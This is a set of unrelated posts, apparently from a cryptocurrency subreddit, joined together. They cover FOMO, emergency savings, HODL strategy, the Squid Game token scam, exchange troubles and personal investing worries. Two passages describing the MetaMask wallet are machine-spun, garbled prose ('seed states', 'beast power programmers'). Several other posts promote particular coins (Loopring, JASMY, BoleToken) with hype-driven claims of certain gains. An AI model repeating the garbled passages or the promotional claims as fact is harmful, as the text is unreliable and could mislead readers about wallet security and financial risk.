Has anyone else had these issues? Personally I'd say don't bother using the app if you were planning on doing so. 

Rant over. Socios sort your shit out.

Pumptober has been a beautiful sight to see. Coins pumping left right and centre thanks to Big Daddy Bitcoin making a new ATH!

Its very easy to feel the fear of missing out (FOMO) when you see astronomical gains across the charts. Its risky to chase a pump but sometimes we do it just for the thrill of it - and thats okayas long as the money we are investing is something we can actually afford to lose!

When I say lose I mean literally turning your $100 into $0. 

Crypto is a ridiculously volatile market and although its not uncommon to see 10x or even bigger gains, its even more common to see people lose all or a large chunk of their money. **Cough** Suid Game **Cough**

I see it a lot in the daily, people taking loans out or over-investing their savings into a project  this is a huge risk because nobody knows whats around the corner. 

I honestly couldnt care less what coin you want to invest in, or even whether youre going to do research first or not - but if youre going to be investing, make sure your bills are paid; theres food in the fridge; and that even after youve deposited in, that theres still fiat aside for random emergencies. 

**Anything** can happen. Be prepared!

I see all the time people that sell their crypto cause some minor emergency happened. Problem is that it is terrible investing strategy. Money for crypto should be money for crypto, not for anything else. It is easy to took those money out, but much harder to return them. You are basically bank and debtor in one person. It is conflict of interests. Some part of you want to spend money you shouldn't spend and some return them. Usually debtor inside you win. You talk bullshit that you will return money and invest again. Most often you will took those crypto money again to repair car, buy new TV, buy a gift or lend them to someone.

 People treat their savings and investments as money they can use freely. They should treat those money as lost. Savings are for emergencies not to buy pizza or new clothes you don't need. If you need to visit dentist, repair car or pay rent being jobless, then spend your savings, not for unnecessary pleasures. Emergencies are things that are unpredictable, emergency savings shouldn't be used for things that you came predict or plan them. Emergency money shouldn't be used for holidays, planed home renovation or to buy bigger TV. If you will lose job or be ill  will you  still think it was good idea? Probably not, but then it will be to late. But cause you  wasted emergency savings, so you will cash out your crypto...

Emergency savings shouldn't be treated as daily budget. And investments shouldn't be emergency savings. I usually treat investments as money that will never be possible to access unless I want to DCA cash out, cause they were profitable enough.

To be clear I don't say to never took invested money out, just in real emergencies, unless there is war or you  are literally dying I see no excuses to use invested money. You should predict your car can broke a little or that you will need to visit dentist. Savings are for it. If you have no savings then you made mistake and invested too much in crypto at the first place.  If you know you will waste  crypto on things you don't need or can live without, then maybe better to lock them for certain time or at least put on locked staking. What you can't access will not tempt you.

I recently started invested in Crypto but i considered myself a fast learner. What i have learned is actually pretty simple. I will never be a millionaire or even if i can be a millionaire one day, it's not with some coin everybody is talking about. 

There's so much shitposting and fakenews about Shib that i'll be a foul if i keep hodling them. I got fouled but lucky me i just bought them few days before internet was actually broken. So i'm totally happy and no regrets if i made 50$, better than losing all for an hype coin. 

So don't trust all that "burn" mechanic which is not actually there, don't trust shit youtubers promising huge pump on robinhood listing right "in the next few hours". 

Just my story not an actual financial advise.

It seems these days NFT's are the next big thing at least for a little while, it's like the shit coin season of a few months ago.... 

Like I see so many tiktoks and posts on Instagram about how people are making so much money, but it just seems like most these people actually make their money on things such as selling courses etc.

Whenever I check any NFT sub it screams the same bot and shill infestation that cryptomoonshots has, am I wrong or is there a credible sub for that type of stuff?

Has anyone actually made consistent money with this? Just seems like a bubble to me but open minded.

I am fairly new to crypto had my upd and downs like the many of you. Made it big with doge transfered all of it to more stable coins such as eth, btc and so on. 

So my theory is to have some money invested into shitcoins because simply higher potential for profits although higher risks. And I was wondering on getting your good people's opinion on DENT.

FYI its fyling rn as we speak but I wanted to know long term capabilities or potential.

You are new into crypto because a dog, a rocket or elon persuated you into it. Perfect!   


But please put things into perspective:

&amp;#x200B;

1. it's highly unlikely that your 50$ investment will yield you 100'000$ in the matter of a year
2. it's easier to say HODL than actually hodl
3. combining 1 and 2; even if your 50$ would go 2000x it's highly unlikely that YOU didnt jump ship earlier
4. for the love of god - DCA
5. IF you are lucky and your meme/alt is mooning, consider laddering out
6. EVERY sub is an echo chamber, why wouldn't it
7. maybe an unpopular opinion: even if everybody says "not your keys, not your coins", if you go with an reputable exchange (coinbase, binance, whitebit, kucoin, etc.) with kyc AND 2fa you are more or less safe. it can be very overwhelming for the first time to set up metamask or a ledger
8. last but not least, maybe even the most important advice I have: Nobody knows shit about anything!

enjoy the ride, in 10 years we are all laughing at our pools (or don't; point no. 8)!

Before the angry mob comes, let me say that I am a hodler but not in a traditional way. Everyone here knows HODL culture and I fully support it. BUT.. when you see your investment going up 40% in a day, it is a good move to take **small percentage** of your gains and turn them into stable coin. Keep it in the stable coin and when the asset which pumped heavily before dips, you buy more of it. You didn't sell per-se but you kept the profits from the pump on the side, so you can invest even more when it pullbacks after that sharp pump.

I always keep a small percentage of my portfolio in stablecoins for that very reason. Can this strategy fail? Sure, but the benefits so far heavily outweighed the cons. 

Is this betraying the HODL philosophy? No. It's simply enhancing it, making it even better. I know it's not rocket science but many people refuse to take even smallest gains. With extreme gains, pullbacks are not an anomaly. Use that to your advantage.

The MetaMask crypto wallet application permits you to send and get Ethereum, Eth-based tokens, Binance Smart Chain tokens, and a large group of different coins from various chains. Probably the best component of MetaMask is that you can really tweak the chain you need to get from and acknowledge more modest coins from moderately dark chains the vast majority don't utilize. You may be asking yourself at the present time, "for what reason would I need to utilize a dark chain that no one uses?" And the appropriate response is basically: cost. More modest activities utilize these chains in light of the fact that the exchange expenses are amazingly low, and numerous crypto financial backers search out those extraordinary, low-cap projects which are here and there facilitated on these little chains. There is not even a shadow of a doubt, if you get a crypto wallet application to store your crypto tokens and collectibles, the last thing you need is to get tested when you need to utilize it. Luckily, MetaMask is perhaps the least demanding wallet to utilize and the expectation to absorb information is generally little. So it works very well for noobs in the crypto world just as prepared professionals throwing Bitcoin every day. The extraordinary thing about the MetaMask design is its simplicity of route, you can find in a real sense everything before you. MetaMask utilizes extremely incredible seed states that are especially difficult to sort out in any event, for the most astonishing beast power programmers, subsequently keeping your wallet exceptionally safe constantly. Yet, successful security is unimportant on the off chance that you choose to surrender your seed expression to somebody you need to accept will give you free cash in some web plot. So you can depend on MetaMask for security, it's strong, yet eventually,MetaMask and your crypto need to depend on your sound judgment to protect everything.

MetaMask's Swap work gets rid of all of this issue by mentioning costs from every single accessible aggregator.

Like I know people have been saying it but does this need to be hammered home? Shiba's a pyramid scam, why are people proud they're making profits off of something so rubbish. For every winner how many losers are there going to be? Isn't this the exact issue people currently have for the economy. 

"Big banks are the greatest evil of this generation and we need to stop them by taking away their power". while in the same breath "Oh Shiba inu is a pump and dump that's controlled by a few individuals but if you know what your doing you can make a bit of profit of off other peoples hard work".

Is this irony? That people in the community are shilling what they apparently hate?

This is part 2, consisting of the top comments on the first post. I gathered and listed everything that is advice-worthy in my opinion. The source here is you, the redditors.

\- **Don't listen to advice on the internet**   
Top comment. Although a meme in this case it does have some truth in it. Nobody on the internet has his heart on you and nobody cares if you win or lose.   
Odds are, strangers want you to lose to make them feel better on either their losses or to boost their ego on their profits. Take everything you read on the internet with a grain of salt.

\- **Always buy high, sell low**  
This one is also a used as a meme, but if you flip it around is actually a valuable piece of advice.  
In order to profit, you are supposed to buy something at a low price and sell it at a higher price. In crypto reality though, I would paraphrase to ''buy when it's red, sell when it's green, don't chase pumps and if your coin is dumping - wait it out, don't sell it at a loss. It's time will come'' This considering you are investing in a serious project, ofc.

**- Do not dump more money into the crypto coin after it pumps in hopes of getting more gains.**  
This one might come out as a bit controversial, but it's mostly a situational thing, learned through blood. The long story short here is this. If a coin has already pumped, the chances of it pumping again are slimmer than it having a correction back down. Investing more in an already pumped coin has a higher risk, lower reward ratio. Avoid it. Unless ofc. news suggest otherwise. 

**- It's safer to keep your coins on an exchange, rather than a cold wallet.**  
This is one I don't really agree on, but many people do, so I will explain a bit more and let you decide for yourself.  
In the past crypto exchanges used to be hacked all the time, people got robbed out of their coins constantly. Now, established exchanges don't get hacked, or rarely and safety is much better.  
However, cold wallet being the safest option in general does have it's drawbacks.   
If you lose your seed phrase - your coins are lost. Turns out many people manage to lose theirs.  
Some redditor pointed out that living with roommates makes hiding your phrase a whole lot harder than having 2FA on your phone to your exchange. And, if you manage to lose all your access to the exchange, they can retrieve it through KYC.   
I agree, for some people it might be safer to keep their coins on an exchange. Please just use the top 3 exchanges in that case.

**- Don't buy the popular sentiment. Look at the fear and greed charts.**  
This is probably a big one. Learn how to read popular indicators and base your actions on them. People around you can be very misleading in their sentiment, either overbullish or overbearish.   
It's very easy to fall into the trap of following someone who seems to have a bit more knowledge of crypto than you. Don't. Learn yourself.

\- **Don't send any coins to anybody to "confirm your address". Nobody will amplify your coins, it's a scam.**  
These are some of the most popular scam tactics. Scammers will always promise some big reward, but you have to be the one taking the first step in transactions for some tiny amount of money in order to receive the big money. Do you remember the popular Nigerian prince email scam years ago?  
Basically the same thing. Don't send anyone money, nobody in this world will spend even a minute of his own time to help you win big.

**- Do your own research and form your own opinion.**  
This one seems pretty obvious, but I will add to that. Choose your sources of information wisely. Take everything with a grain of salt, compare points of view and than form your own opinion.  
We all know about the recent Squid scam. Many people fell into it because of BBC posting an article. Yes, that BBC. Some months ago popular news websites announced that Wallmart will accept Litecoin, than some other websites published that aswell. Turned out to be fake news, but many people lost a lot of money because they trusted unreliable sources.

\- **Don't forget about the IRS because I guarantee you that the IRS won't forget about you.**  
Taxes. Remember that you have to pay taxes on everything you make. Try to look at this as a good thing. You want an ambulance when your beloved one is sick? That comes from taxes.  
You want a firetruck when you have your house catches fire? That comes from taxes.  
You want to be able to count on the police doing their job? Taxes.  
Clean roads, streets, parks - all that comes from taxes.  
It's a comfort we all take for granted. Don't be like this, in order for a society to work - pay taxes.

**- Have an exit plan for each coin and write it down. Don't allow greed to control you not making profit.**  
Really, write down a plan and follow it. Nobody knows when the bull market will end, but we all know it will end at some point and all coins have 80-95% correction, basically wiping out all your profits and putting you in the bloody red. It's easy to fall victim of your own greed when things go parabolic, but remember, that's how people lose their money overnight. Follow your plan.

**- Only invest what you can stand to lose.**  
At this point this one sounds more like a cliche to the OGs here, but you would be surprised how many of the new retail money flowing into the market when the FOMO hits comes from loans, mortgages and basically money people cannot afford to lose without messing up their lives.  
Don't do it. Better have a smaller profit from your own money than lose your home/car/lifesavings.  


Hope you all have a not-so-rough learning curve, because some of those are written with tears :)

Metamask permits clients to straightforwardly interface with Ethereum dApps without the need to run an Ethereum hub. This would include downloading the Ethereum blockchain. Prior to Metamask, to speak with a dApp you needed to give private keys to your cryptographic money wallet  a high-hazard move. dApps presently request consent for reserves access through Metamask, which implies there is no requirement for your private keys to be shipped off the dApp, making the cycle significantly more secure.

Hi guys and gals!

How many of you are also investing in regular stocks, beside crypto?

Diversifying your overall portfolio seems like a good idea, but it looks like people on financial subreddits can be a bit negative about investing (too much) in crypto. 

Does this sub feel the same about stocks?

Also: why do you think people on the financial subs can be so negative about crypto, are they more wary of the risks and volatility?

Bonus question: how do you think the stock market will develop in the next 10-20 years, with the increasing adoption and popularity of crypto?

Wishing you all a healthy and constructive day!

Even Vitalik Buterin has to send some test 0.1 Ethereum before his actual 1500 amount to make sure his Ethereum isn't lost to an address that doesn't exist. This really shows that Ethereum is truly decentralized and no one can really reverse or undo any transaction on the Ethereum network. 

It's just one of the reason why I truly trust Ethereum unlike some other Ethereum killers. Moreover, this Ethereum also went to [impetusgrants.org](https://impetusgrants.org) to help aid more research which is even more good news for humanity as a whole!

I am thinking to own just one of the 2 coins and see what happens within the end of the year. Which of the 2 coins do you think is wise to have for the incoming 2 months?

The ratio behind if is that I feel is better to own an higher fraction  of just one coin rather than lower fractions of 2 coins, and right now I have nor extra cash to invest, so this seems to be for me the only way to do that.

This strategy already showed to me its results considering at the beginning of the year my wallet was composed of more coins (btc, eth, eos, ads, xrp, trx, ankr) and during the last months I felt safe with only 2 coins, especially because they vere THESE 2 coins.

So I guess what I'm trying to understand is what the community (you guys ) think is the best coin among eth and btc for the next 2 months.

Thanks for all of you spending a minute to vote and to share their thoughts, very appreciated.

Cardano has been at the forefront of growth when it comes to smart contracts capability. Ever since smart contracts debuted on the blockchain, high traffic has been anticipated for the network. Smart contracts on Cardano had been in the works for quite a while and were one of the most anticipated upgrades in the space. Now that this is a reality, the developer has had to move on to building further capabilities to accommodate the anticipated traffic increase.

Hydra was built to make room for increased traffic on the network. ALayer 2 solution like Hydraprovides the much-needed scalability to maintain high throughputs for the applications on the blockchain. Hydra will also help to regulate fee rates on the blockchain. Thereby providing acceptable fee structures for the users. This makes it a very useful solution and Cardano founder Charles Hoskinson has reiterated the importance of the solution to the network.

Hoskinson Says Hydra Is Vital For Cardano

Charles Hoskinson organized anAMA (Ask Me Anything) session on YouTubewhere members of the community were able to send in questions they would like answered. It was during one of these questions that the importance of Hydra was emphasized by the founder.

By Hoskinsons own admission, an incredible amount of work was being put into the Layer 2 solution. The capabilities that Hydra provides the network have been one of the most crucial developments by the developer. Cardano is expecting high traffic on the network and Hydra will ensure that the network is able to process the increased transactions in a timely and orderly fashion.

Hoskinson explained that the team was putting more resources into the project because its such a high commercial priority. Cardanos DeFi community is still in its beginning stages. As the community finds its footing, traffic on the network will spike heavily. Once this happens, Cardano is going to get hammered by an enormous amount of traffic, said Hoskinson. Hydra is a necessity for that.

Progress On ERC-20 Converter

Hoskinson updated the community on the anticipated launch of the ERC-20 Cardano converter. The founder confirmed that the Singularity net was currently in the process of migration. The converter is meant to target two main parts of the project  the Main Chain and Mamba. With the arrival of Plutus, the network has been able to begin working on the main chain and has presumably made some progress in this regard. As for Mamba, a two-way bridge is being developed for it.

The long-term goal is automation and bridging, so its easy to move between and wrap assets and so forth. We view it as a nice commercial tool. When people come and they want to migrate, theres a process, a team, and a collection of competencies there.

I wrote the initial GME and Loopring post, which seemed to help and educate a lot of people on their potential partnership.

As Loopring rocketed yesterday, I wanted to try to explain why so many people are buying LRC. This coin has pure fundamentals, and provides one of the most incredible solutions to a problem we all complain about.

**No More Gas Fees (You read the correctly)**

Ethereum is a beast (ETH bull here) which is the future of cryptocurrency but the Gas fees really can affect us. We are tired of paying $150+ in Gas fees, just to transfer or buy $100 worth of a cryptocurrency. That with long delays just to process a transaction can be brutally painful for our wallets!

Therefore, Loopring is being purchased and was the number one cryptocurrency yesterday. Loopring is a secure layer 2 protocol which allows users to transact without gas cost and without delay, while still enjoying the full self-custodial security of Ethereum. 

Yes, in the future, there may be more services coming out to reduce Gas fees, but we have this here and now. And it works beautifully.

**How does it do this?**

Loopring uses a data structure called a Merkle Tree. Its like an off-chain database where your assets are recorded and represented off the chain. However, you can still trade, make transfers on Ethereum without paying gas fees, as it all happens off chain.

Yes, trading is free. You can literally go from one currency to another. I could take my ETH, and swap this to USDC  no gas cost at all. With Gas these days, that would save me about $200.

Once youre ready, click Swap and your transaction will be executed instantly. No delay, no gas fee. Your L2 balance will be updated.

**Its Blazing Fast &amp; Your Funds Are Safe**

As Loopring processes all activity off chain, it compresses all transactions into one transaction, and does all the hard work before it processes on the Ethereum network. This means it uses Ethereums security protocol, bit can process with a much higher throughput.

Its security is so good that if Loopring stops working, your funds are completely safe. As long as Ethereum exists, you can always withdraw your funds from the rollup.

**So, its Faster, Safe and What Else?**

Loopring also extends this technology to its exchange. The Loopring Exchange is a DEX which has an ANM, an orderbook and a mobile smart wallet. Liquidity staking is also there for anybody who wants to provide their assets to get a return.

With the potential GME partnership, Loopring allows companies to build platforms using its system. For example, a NFT platform, which has the scalability, security and speed of a CEX, whilst being able to cut gas fees as any company will take advantage of Looprings Layer 2 protocol.

The Loopring Smart Wallet is perfect for holding assets safely (you have the ability to lock your wallet), but allow perfect for traders who want to take advantage of cryptocurrency swings without having to pay huge gas fees per transactions. Simply open a wallet, activate it on to L2, and your ready. Its also near instant to process a transaction.

**To Summarise:**

To Trade: **No Gas Fees**

To Add Liquidity: **No Gas Fees**

To Swap Tokens: **No Gas Fees**

Its blazing fast  **no more delays or price slips waiting for a transaction to be processed due to high gas fees.**

**I hope this helps you understand why Loopring is rocketing, and why people are so excited. GME is just one potential partnership it could gain. With an exciting announcement coming in Q4 (mentioned by the Loopring CEO), this is about to rocket up the cryptocurrency coin rankings.**

Hiya Guys  


So Yesterday I performed 3 exchanges in Exodus desktop wallet (PC) in the evening.  


I exchanged the following coins...

Cardano to Solana  
Cardano to Enjin  
Bitcoin to Solana

All 3 appear to still be stuck in

"Exchange in progress"

Exodus just constantly shows the 3 exchanges in progress when I log in.

I did contact Exodus this morning via email after them being stuck overnight but they asked me for the order IDs and then promptly absolved themselves of responsability and said to contact Switchain which I did via email but have had no reply.

Any ideas what to do in such a situation or who to reach out to if Switch do not reply? I read some old reviews on Switch which did not look promising.  


Also of course my Exodus is now just spinning buffer face at me and telling me I have 3 in progress.

&amp;#x200B;

Cheers

Bitcoin is an accumulation game for years to come.
To take full advantage of its revolution, you don't need to develop complex strategies.
The simplest strategy is even the best with Bitcoin.
It consists of 4 simple steps: Buy Bitcoin, HODL Bitcoin, Store Bitcoin on cold storage, Repeat.
No need to constantly watch the price of Bitcoin. You are in it for the long haul. Volatility only hits those who focus on the short term.
In the long run, the price of Bitcoin keeps rising. So you'd better be patient to take advantage of the impatience of those who don't believe in Bitcoin enough.
Patience is always rewarded with Bitcoin. It has always been that way.
It's up to you to choose the right strategy.

The uptrend on solana blochchain is basically due to the fact that Solana Blockchain it self is highly scalable and have a very low network fee, many traders getting to know this makes it more interesting and always want to invest. BoleToken is a semi-deflationary token built upon Solana Blockchain, the idea is to bring more real world use cases to the token, link Online Academy which can be likened to Udemy and some other platforms like NFT market places, premium apps, NFT gaming and so on. Getting to know many tokens can not be bad but the future plan of the token will be the best, in crypto space these days people tends to invest more on meme coins neglecting that meme tokens most times are temporary investment but tokens are supposed to be with purpose, investing in a good project will go a long way in increase the usefulness of cryptocurrency and bringing to world the read idea behind the decentralized world, making people to know that though it's decentralized but it has it optimum advantage than just putting your money in banks without any usefulness.

The Squid Game Token scam has proven once again that people will invest money into projects that almost straight up tell you it's a scam in the hopes of getting rich quick.

Anyone who read the white paper full of grammatical errors or have taken at least 5 minutes to DYOR about the token knew this was as shady as projects come.
People who bought, immediately noticed they couldn't sell and posted this everywhere and still people invested because they believed it would be the next doge or shiba that would go parabolic on hype alone and make them an overnight millionaire.

When I saw the token appear, my first thought was that on the show everyone except for one got eliminated and only the winner was left with the spoils.
Personally almost every red flag was triggered when I looked into it and luckily I trusted my common sense.

I completely understand the appeal of getting rich quickly, but diving head first into shady projects in order to get in early seems like a destructive way to handle your portfolio.

Ofcourse people can do what they want with their money, but I recommend everyone to DYOR and not FOMO into new projects without giving it some thought.

Tl;dr: 99% of the time your common sense can save you a lot of money, but people looking to get rich quick will fall into these traps more easily.

Exactly seven years ago things in top 20 Market Cap coins looked this way. Putting things in perspective opens a sigh for the big picture. Crypto has changed a lot and will change even more. 

1. Around half of the coins in top 20 on this date seven years ago are non-existent or almost gone today - Nxt (former #6, ranked #879 today),  Counterparty (former #8, now is #594), Nxttycoin (former #15, today non existent),  NXTventure (former #20, non-existent today) the list goes on.
2. Ethereum didn\`t even existed back then
3. Bitcoin price was $325.89 and the trading volume was less than $9 mil. Today the trading volume per 24h is $34 bln.
4. Funny or not one of the coins in top 10 back in 2014 is Dogecoin and it's still in top 10 today
5. Besides some coins in top 20, the rest from top 50 or even top 100 are far behind today, many of them not in existence anymore and of them are out from top 100 long time ago.

I wonder how the Crypto world will look like in just some 7 years time.

Just shows how fast Crypto is being adopted. Banking apps are nowhere close to even the top 10 while Crypto is number 1 in all categories. Even in the Apple app store, Coinbase is the number one most downloaded app. 

This is huge considering Facebook, Tiktok, Snapchat, Instagram or even messaging apps are below Crypto apps. Crypto is literally growing faster than the internet in its prime years. Honestly, I believe this is just the start of Crypto becoming mainstream. I can only imagine what the future holds.

I've managed to stock up on different coins over the last year after being initially skeptical of cryptocurrency as a whole.

I followed good strategies from this sub and during this bull run I've seen my first real profits. 

Then life decides to throw the financial emergency curve ball at me .I just sold my whole bags of XTZ and  Dot to pay for some outstanding tuition fees.

Hopefully I manage to come and buy back in at a good price if they don't suddenly moon. Watching the market move without the power to purchase just leaves me a bit depressed.

Stuck in a dead-end job &amp; investing in crypto in the hopes of life changing wealth, watching friends and schoolmates advancing careers &amp; moving up in society whilst feeling very much left behind.

Got some money in crypto (Toyota money) &amp; plenty of hopium most days, but sometimes my mind pulls me away from all that crypto could be &amp; reminds me of how little perceived value there is to my digital venture by most people around me.

Even if someday my Toyota money is transformed into life-enriching wealth, I'm unsure if I could enjoy the same carefree lifestyle (nice car, swiss watch) without my conscience constantly reminding me that I did not come into wealth via excellence in my studies or life changing skills &amp; expertise. 

I feel like a rat riding the coattails of giants, watching the steps with anxious expectation for the dropped crumb that would become my greatest financial achievement. 

Due to these thoughts, I've recently become more apprehensive in discussing crypto with many of my senior colleagues &amp; family. I feel undignified for discussing my modest yet effortless gains whilst knowing that they've worked hard for every dollar their whole lives, excelling amongst competition &amp; a whole spectrum of challenges in life for what they have now. Even in the most desirable of circumstances I would become "The unindustrious daydreamer who got lucky" and the best outcome for me would thus be the greatest insult to them. 

It pains me to think about all this, to know that even if crypto worked out in my favour it'd be labelled 'dumb luck' &amp; the dynamic between me &amp; my seniors would most likely change for the worst.

So yesterday, Kraken sends out a tweet that if they get enough likes they will list Shiba today. Ofcourse, post blew up.

Is that legit? Or Kraken is just trolling a bit?

What could that bring to Shiba?

With all this adoption, maybe I should throw few bucks in it


Unleash the love or hate on me now, I am just following trends. I dont want to miss this one too.

Check the tweet here.

Today i wanna talk about a coin that i think deserve a bit more recognition and that coin is called Banano. Banano is a so-called "fourth-generation" cryptocurrency that utilizes Directed Acyclic Graph (DAG) based block-lettuce architecture, where each user possesses his own blockchain. Banano forked from Nano in April 2018. 
    With Banano, instead of running arbitrary calculations to "mine" a cryptocurrency, your computer runs protein fold simulations through Folding@Home to help scientists around the world fight diseases such as Alzheimers, Cancer, Parkinson's. As a result of your contribution, you get rewarded in Banano. Although i will admit that the folding reward are a bit low but hey most of the people that are folding don't seems to mind it as they fold to contribute to medical researches and not for the profit. 
    Me personally i have been folding towards cancer researches since April cause i freaking hate cancer as its have done so much harm to my family. Now i'm not smart or rich so if it wasn't for banano i wouldnt have been able to contribute to cancer researches so, the fact that i'm able to contribute to medical researches by folding on my laptop is a blessing for me.

Do you ever feel there is too much content on this sub to see the wood for the trees?

Posts seem to fall within either 1) pumping random coins, 2) criticising how this sub operates, or 3) moons related. Now I'm not saying its not good to see what is happening and that people can feel like they can post, but do you ever struggle to actually read what may be useful or of some value?

May I need to stop sorting by new and start sorting by top? Anyway I'm interested to see how you all seem to navigate this sub? Some of you seem to spend a lot of time on here and appear very informed about its musings (take the word informed with a pinch of salt ).

Ps. Plug for the removal or reduction in the 500 character count!

I cannot stress enough the usefulness of charts on Defi Llama (website or app) enough for people investing DeFi layer ones. Its broken out by chain, so you can see the Total Value Locked. 

Posting this here mostly for beginners who feel lost in speculation and have trouble understanding adoption. On DefiLlama you can see which dapp under each chain is getting the most traction.  Its also a good app to discover micro cap gems, at your own risk

AVAX is going absolutely on a tear like nothing I've seem before.  The six month old blockchain claims to have hundreds of dapps coming in the next year, partly because its created many liquidity bridges and funded hundreds of millions in grants. It looks like any minute now.  I would not be surprised to see AVAX jump i to the top 10 by the end of the year

The others not messing around are Ethereum of course, but not its L2s, surprisingly. I was shocked to see lower adoption there.

Fantom and Solana look like theyre also going to be flippening their superiors shortly. This is a crazy time! Dont ignore this great free indicator

The overall defi market is booming, all seems very bullish to me!

 **BTC**

BTC said yesterday that there is a high probability that it will fluctuate around 60,000 points, the bottom of the box is 58,000, and the top of the box is 63,000, which is quite normal in this range. Funds will continue to drive other sectors, and it is normal for the fund to increase by 20 points in a day. Omgs snapshot airdrop and DOTs card slot auction will soon begin. Its worth keeping an eye on.

**ETH**

ETH has said many times that the 60 moving average is a low opportunity, yesterday low suction to now also have a certain profit. The end point is to focus on gamefi, metaverse and other concepts. This is a long-term concept.

**Topic**

Omg spoke yesterday at less than 14 and is currently at its highest near 15.5. The short-term target is above 18. For fear of a pullback, you can consider controlling your position. Stephero will launch the game in November, the current price is very low, has fallen by 50%, there may be a wave of market, but the shape is poor, there may be a new low, target 1.2 stop loss 0.6

**Risk Warning**

**The above analysis is for reference only. Please be cautious when invest as there are risks in the currency market.**

You often see lots of cypherpunk total anarchy talks amongst hardcore crypto believers. They often paint a picture where crypto maximalists can exist in a utopia free from government regulations, taxmen, lawmen, politics, rules and Big Bank manipulation.

Yes I know what Satoshi wrote in the 1st BTC Block.

But do you honestly think crypto can exist in a vacuum? Are you gonna found your own crypto state and provide your own electricity, sustenance, roads, internet infrastructure, telecommunications, etc. so that you can be free from the tyrannical governments?

Because guess what, in order for crypto to exist, you need a society and a government that's giving you the essential stuff for crypto and you to live off. And then you're bound by a social contract. It's lunacy to expect that governments will keep giving crypto bros all the infrastructure without demanding their dues. 

Whether you think it's fair or not is irrelevant. The realistic expectation is to co-exist and expect more regulations. We aren't cheering for it. It doesn't make us happy. Yes we'd rather have crypto be free from this rotten tradfi world. But hey, I also would rather have a castle in the sky and a pile of gold to swim in. What we would rather have, frankly, doesn't matter one bit. Be realistic. Crypto will force tradfi to change due to competition. Crypto will convince many regulators and politicians to change their views. 

But it's nave to expect crypto will be able to do whatever it wants and create a bubble of utopia for anarchists and anti-establishment mumbojumbos.

I'm fairly new to crypto and have a small amount in some of the bigger names, ADA, XRP, ETH and so on.
I got talking to a friend from work who was telling me he expects the market to rocket over the next month or two and told me about various currencies that he expected to do well.

I have 2 questions
1. Woukd he be right that the market is expected to take off over the next month or two and why?

2. What is the best way to do DD on coins and make decisions and know if they are fake or not like the latest squid games coin?

I'm sure everyone has seen the Anubis DAO rugpull news by now but have you read the article about the guy who lost almost $500k in it?  In the article he says, We, in crypto, tend to have a buy first, do research later, mentality."

Don't be like this guy!  Do some research before putting your money into these projects.  Especially if you're putting in large amounts!  I'm not saying that research could have prevented this specific rugpull but Jesus Christ!  To put almost 500K into a coin without doing any research is just a recipe for disaster!

I'm all for gambling on some low cap shitcoin projects if you view them for what they are.  Lottery ticket type buys that may or may not pay off.  Just realize that your investment can easily go to zero instead of the moon!  Build a portfolio with some trusted tried and true cryptos and of course you can have some gambles in there.  If they moon great and if not you're not going to get wrecked.

This Learn and Earn was dropped last week before quickly disappearing, but it is back for good now, so you can earn $1.50 of Loopring (LRC) for answering 3 questions correctly. Seems like quite an appropriate asset given all of the news/hype surrounding Loopring and GameStop over the past week.

The answers to the quiz, if you don't enjoy learning, are:

Q1. Ethereum Scaling Protocol
Q2. Requiring Bank Account
Q3. Loopring Governance Token

I don't know if this is certain regions only, can only confirm it has appeared for the United Kingdom, but will update the post with any geographical details I hear of later. Hoping everybody can take advantage at some point though.

Hope you enjoy your free crypto all!

Im new to the whole Crypto world and after 1 month of lurking and reading about investments I decided to finally step in. 

My simple goal is to have FU money and have freedom of course getting rich is nice but Im aware that realistically it aint gonna happen any time soon and crypto isnt the magical wand that will achieve that.

So after lots of reading I decide to go for the next:

60%  for BTC &amp; ETH
40% For ALTs.

The alts that looks interesting are next:
- DOT
- ALGO
- Efinity 
- Cartesi 

On watch list:
- XRP (waiting to see the whole sec fiasco)
- ADA (doesnt look that promising to be honest)

So please give me your opinion and any suggestions.  Any trending coins that I need to watch out for?

This is not a meme coin. Many big names involved and ideas for development. Ex-Sony big wigs and Toyota partnership approaching.

Started originally at $3 and quickly got obliterated due to Japan regulators getting involved in a perfect storm value evaporation. Regression to the mean is kicking in now that regulators are on board.

Japanese code of honour and ethics, strong hive mind,

Here's what BryantheBrown commented:


""**First**- Japan is incredibly hive-minded. This is not an insult, let me 'splane. There's a reason PlayStations reign supreme and XBOX bombed in Japan. There's a reason we see Honda Civics every damn corner we turn in the States but finding a Ford in Japan is like spotting a lizard person. I mean, we all know they exist we just don't see the damn things. There's a nationalistic urge to buy Japan. I can't blame them. Their products are simply topnotch. As the 3rd largest economy in the world, JASMY will syphon early crypto adoption in the untapped country.

**Second** - if you haven't done your DD on the company you need to. Read the white paper. Read about the team. Read their 3 part article posted on the @JasmyMGT Twitter. The team and company is second to none. The CEO created VAIO in a day and age where Sony was falling behind in the laptop market. My job is to look through startup applications and sift through volumes of superfluous statements and embellishments to find actually use-case value. This company isn't trying to awe us with 50 cent words and aspirational BS. User privacy is a huge deal and has knocked fortune 500's to their knees.

**Third** - Yes there is meme value. Some of us hate it. Some of us love it. We just have to accept the reality that this being the first domestic Japanese crypto on Western exchanges and even in their own country (bitpoint is Tokyo-based) allows them to lay claim on the Japanese meme market. Pushing aside all the other gaijin-owned Japanese wannabes (I'm in this bucket too).""



**JASMY deserves your full attention.**

Another crypto scam that gets no attention is called Amfeix. They started late 2018 with returns ranging from 4-20% monthly based on how their traders did. In the beginning the anonymous ceo kept track of everything with a spreadsheet until April 2019 he scaled and created an Amfeix portal that used smart contracts as a accounting system. They had a large telegram group with investors all happy with the product. All was well until late may 2020 when they claimed a developer involved with the withdrawal process stole 15 btc and the portal was no longer safe to use. At this time they are managing 6543btc. Since then they have hired new developers and created a brand new portal with a token system as an accounting method. The problem is the new portal has been ready since august yet they still wont release the btc to investors with very little communication. This is very summarized chain of events but its been a year and a half of them holding onto investors 6543 Bitcoin and I hear nothing about it in any crypto media

**Charging electric vehicles**   

EV car owners are frequently dissatisfied by the difficulty they have in finding a charging station and paying for it. Multiple charging stations have been installed in various places, yet there is a dearth of awareness among EV owners. Furthermore, rapid charging is not available at all charging stations. As a result, these stations have long lines.  

With the rise in electric car sales, numerous firms have developed mobile and web apps to make paying for charging stations easier. Despite the abundance of alternatives, payment at charging stations is delayed owing to network connectivity challenges, lack of app membership, lack of a bank account linked to the app, and other factors. These difficulties may cause the billing procedure to be delayed. As a result, a faster and easier approach to complete the payment process at charging stations is required.

Okay please do not make fun of me, Im just trying to understand.

 There was this story of a guy whos balance on robinhood where his balance reached -730k 

First of all, how is that possible? And is it possible with crypto? Right now, I have invested 20k, so worst case I simply lose everything and get $0 right? Or can I go into debt? Ik robinhood is stock but still wanna understand in case.


